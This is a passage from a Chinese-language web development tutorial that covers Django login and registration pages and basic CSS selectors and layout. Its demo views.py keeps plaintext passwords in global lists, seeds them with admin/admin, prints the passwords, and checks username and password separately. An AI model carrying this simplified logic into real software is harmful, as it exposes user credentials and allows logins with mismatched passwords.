class="string">&quot;/register&quot;</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            &#123;&#123;message&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里面有一个 <code>&#123;% csrf_token %&#125;</code>，是django所采用的一种防御措施，必须要有对应的token才能访问。为了防止<strong>跨站请求伪造（CSRF）</strong>攻击，通常需要在表单中包含 CSRF 令牌。可以使用 Django 提供的模板标签 <code>&#123;% csrf_token %&#125;</code> 来实现这一点。这里要提交数据就用<code>post</code>请求了，如果用<code>get</code>请求，<code>username</code>和<code>password</code>会显示在url中，可能导致泄露个人信息。</p><p>编写<code>register.html</code>文件如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/register/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Username:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                    Password:</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Register&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;&#123;message&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>接下来就要编写视图函数来实现登录和注册的逻辑，由于一般网页请求是get请求，首先判断网页是不是post请求，如果不是就直接返回html页面，如果是<code>post</code>请求，就判断输入的<code>username</code>和<code>password</code>是否合法，输出对应的html以及message信息<br><code>views.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse, redirect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Logintest</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_list <span class="keyword">and</span> password <span class="keyword">in</span> password_list:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;login1.html&quot;</span>,&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;登录成功&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;login1.html&quot;</span>,&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;用户名或密码错误&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;Logintest.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">user_list = [<span class="string">&quot;admin&quot;</span>]</span><br><span class="line">password_list = [<span class="string">&quot;admin&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">            user_list.append(username)</span><br><span class="line">            password_list.append(password)</span><br><span class="line">            <span class="built_in">print</span>(user_list)</span><br><span class="line">            <span class="built_in">print</span>(password_list)</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;register.html&quot;</span>,&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;注册成功&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&quot;register.html&quot;</span>,&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;注册失败&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;register.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>由于还没介绍数据库，先用列表来存一下用户名和密码来简略判断一下是否能登录。</p></li></ul><p>最终结果如图：</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408161405289.png" alt="image-20240816140508103"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408161405081.png" alt="image-20240816140525893"></p><h2 id="CSS样式"><a href="#CSS样式" class="headerlink" title="CSS样式"></a>CSS样式</h2><h3 id="应用方式"><a href="#应用方式" class="headerlink" title="应用方式"></a>应用方式</h3><h4 id="在标签上"><a href="#在标签上" class="headerlink" title="在标签上"></a>在标签上</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span> <span class="attr">style:</span>&quot;<span class="attr">height:</span> <span class="attr">100px</span>&quot; /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="在head标签上"><a href="#在head标签上" class="headerlink" title="在head标签上"></a>在head标签上</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种写法相当于定义了一个style类，之后要调用直接调用这个类即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="写到文件中"><a href="#写到文件中" class="headerlink" title="写到文件中"></a>写到文件中</h4><p>编写<code>test.css</code>文件如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.c1</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.c2</span>&#123;</span><br><span class="line"><span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要导入<code>css</code>文件则需要在<code>html</code>文件head标签里面添加link</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;test.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><p><code>CSS</code>有多种选择器</p><ul><li><p>类选择器</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.c1</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>选择的时候用<code>class</code>来选择哪一个样式</p></li><li><p>ID选择器</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#c2</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: green;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>选择的时候用<code>id</code>来选择，与类选择器的不同的是，选择<code>id</code>的标签应该是<strong>唯一的</strong>，但是选择类的标签可以有多个。对于同一个id选择器<code>#c2</code>，例如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span></span><br><span class="line">Test</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span></span><br><span class="line">Test</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>是不合法的，但是浏览器还是会显示同一个样式，但是可能导致程序出现未知错误</p></li><li><p>标签选择器</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">color: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有的<code>div</code>标签包裹的内容全部变为绿色</p></li><li><p>属性选择器</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure><p>所有的<code>text</code>类型的输入框全部变成红色</p></li><li><p>后代选择器</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: yellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.test</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: pink;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>test6<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中先定义了一个<code>li</code>的标签选择器，又定义了一个后代选择器，只有<code>class</code>为<code>test</code>的<code>li</code>标签包裹的内容才显示粉色。</p><p>如果有多级标签，如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.test</span> &gt; <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: purple;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">        test6</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">                test7</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>.test &gt; a</code>是只对最外层的<code>a</code>标签有效，而对里面的a标签没有用，上述显示的结果就是<code>test6</code>为紫色，<code>test7</code>为黑色。</p></li><li><p>特性<br>如果一个标签使用了多个类，若两个类有重复定义的地方，则后定义的会覆盖前定义的，如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.c2</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;c1 c2&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这会显示一个红色边框颜色为蓝色的<code>hello world</code></p><p>如果不想让其覆盖可以在覆盖的地方添加一项<code>!important</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.c1 &#123;</span><br><span class="line">    color: red !important;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="高度和宽度"><a href="#高度和宽度" class="headerlink" title="高度和宽度"></a>高度和宽度</h3><p>通过设置height和width来调整高度和宽度，例如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.hw &#123;</span><br><span class="line">    height: 100px;</span><br><span class="line">    width: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是发现这个比较鸡肋。</p><p>对于块级标签，无论设置设置宽度为多少，它始终占一行，就算宽度比较小，其他内容也不能和它并排显示。</p><p>而对于内联标签，高度和宽度全部没用，无论设置多少，所占大小都是字体大小。</p><p>于是，接下来介绍一个<code>css</code>里面改变块级标签和内联标签的方法</p><h3 id="块级标签和内联标签"><a href="#块级标签和内联标签" class="headerlink" title="块级标签和内联标签"></a>块级标签和内联标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">    display: inline-block;</span><br><span class="line">&#125;</span><br><span class="line">.hw &#123;</span><br><span class="line">    height: 100px;</span><br><span class="line">    width: 100px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hw&quot;</span>&gt;</span></span><br><span class="line">hello world</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hw&quot;</span>&gt;</span></span><br><span class="line">hallow word</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码将<code>div</code>这个块级标签转变为<strong>内联-块级标签</strong>，顾名思义就是继承了块级和内联标签的特性。它既可以像内联标签一样在<strong>一行显示</strong>，又继承了块级标签<strong>可以修改高度和宽度</strong>的特性。</p><p>并且也可以通过<code>display</code>将块级标签和内联标签互换</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">    display: inline;</span><br><span class="line">&#125;</span><br><span class="line">span &#123;</span><br><span class="line">    display: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就完成了两种标签的特性互换<del>（好玩吧，嘿嘿）</del></p><h3 id="字体和颜色"><a href="#字体和颜色" class="headerlink" title="字体和颜色"></a>字体和颜色</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.c1 &#123;</span><br><span class="line">color: red;</span><br><span class="line">font-size: 58px;</span><br><span class="line">font-weight: 600;</span><br><span class="line">font-family: Microsoft YaHei;</span><br><span class="line">font-style: italic;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>color</code>：除了用英文单词也可以接<code>#xxxxxx</code>，x表示16进制数</li><li><code>font-size</code>：定义字体的大小</li><li><code>font-weight</code>：定义字体的粗细</li><li><code>font-family</code>：定义字体</li><li><code>font-style</code>：定义字体是否倾斜</li></ul><h3 id="文字对齐方式"><a href="#文字对齐方式" class="headerlink" title="文字对齐方式"></a>文字对齐方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.hw &#123;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 100px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    width: 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>text-align</code>：定义文本的位置</li><li><code>line-height</code>：定义某一行的高度，这里设置为<code>height</code>值表示在高度上面居中</li></ul><h3 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h3><p>对于以下的<code>span</code>标签，显示出来的<code>hello world</code>是挨着的。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    hello</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    world</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果想要<code>world</code>浮动到最右边，那么就需要用<code>float</code>来控制</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">    hello</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;float: right;&quot;</span>&gt;</span></span><br><span class="line">    world</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浮动特性比较绕，下面推荐一篇文章介绍浮动的原理与清除<br><a href=https://www.cnblogs.com/iyangyuan/archive/2013/03/27/2983813.html ><a href="https://www.cnblogs.com/iyangyuan/archive/2013/03/27/2983813.html">CSS浮动(float,clear)通俗讲解</a></a></p><h3 id="内边距"><a href="#内边距" class="headerlink" title="内边距"></a>内边距</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.outer &#123;</span><br><span class="line">    height: 200px;</span><br><span class="line">    width: 200px;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line"></span><br><span class="line">    padding-top: 20px;</span><br><span class="line">    padding-right: 20px;</span><br><span class="line">    padding-bottom: 20px;</span><br><span class="line">    padding-left: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">    test</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>padding</code>将定义的一个<code>border</code>撑大</p><h3 id="案例二：小米商城导航栏界面"><a href="#案例二：小米商城导航栏界面" class="headerlink" title="案例二：小米商城导航栏界面"></a>案例二：小米商城导航栏界面</h3><p>对比效果如图：</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408192101755.png" alt="image-20240819210136319"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408192102186.png" alt="image-20240819210208851"></p><p>编写html文件如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>小米商城<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#b0b0b0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">line-height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-class">.func-left</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-class">.func-left</span> <span class="selector-class">.sep</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#424242</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">3.23px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">line-height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">3.6px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-class">.func-right</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-class">.func-right</span> <span class="selector-class">.sep</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#424242</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">3.23px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">line-height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">3.6px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.menu</span> <span class="selector-class">.container</span> <span class="selector-class">.func-right</span> <span class="selector-class">.shopcar</span> 